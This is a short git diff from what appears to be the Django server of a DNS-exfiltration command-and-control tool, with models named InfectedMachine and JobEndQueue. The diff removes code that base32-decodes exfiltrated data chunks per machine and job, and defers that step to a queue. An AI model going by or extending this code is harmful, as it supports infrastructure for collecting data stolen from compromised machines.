@@ -1,12 +1,12 @@
-import base64
 import os
+from datetime import timedelta
 from re import Match
 
 from decouple import config
 from django.utils import timezone
 
 from djangoproject.constants.DnsMatchEnum import DnsMatchEnum
-from djangoproject.models import InfectedMachine
+from djangoproject.models import InfectedMachine, JobEndQueue
 from djangoproject.services.DnsService import DnsService
 
 
@@ -66,18 +66,7 @@ class ExecService:
         job.finished_at = timezone.now()
         job.save()
 
-        data_folder = f"{config('FOLDER_DATA')}/{machine.id}/{job.id}"
-        chunks = [f for f in os.listdir(data_folder) if f.startswith('chunk-')]
-        chunks.sort(key=lambda x: int(x.split('-')[1]))
-        with open(f"{data_folder}/extracted", "w") as f:
-            for chunk in chunks:
-                with open(f"{data_folder}/{chunk}", "r") as c:
-                    data = c.read().upper()
-                    if (len(data) % 8) > 0:
-                        data += '=' * (len(data) % 8)
-                    f.write(
-                        base64.b32decode(data).decode('UTF-8')
-                    )
+        JobEndQueue.objects.create(job_id=job.id, processable_at=timezone.now() + timedelta(minutes=5))
 
     def create_machine(self, machine_id: str) -> InfectedMachine:
         machine = InfectedMachine(dns_identifier=machine_id)
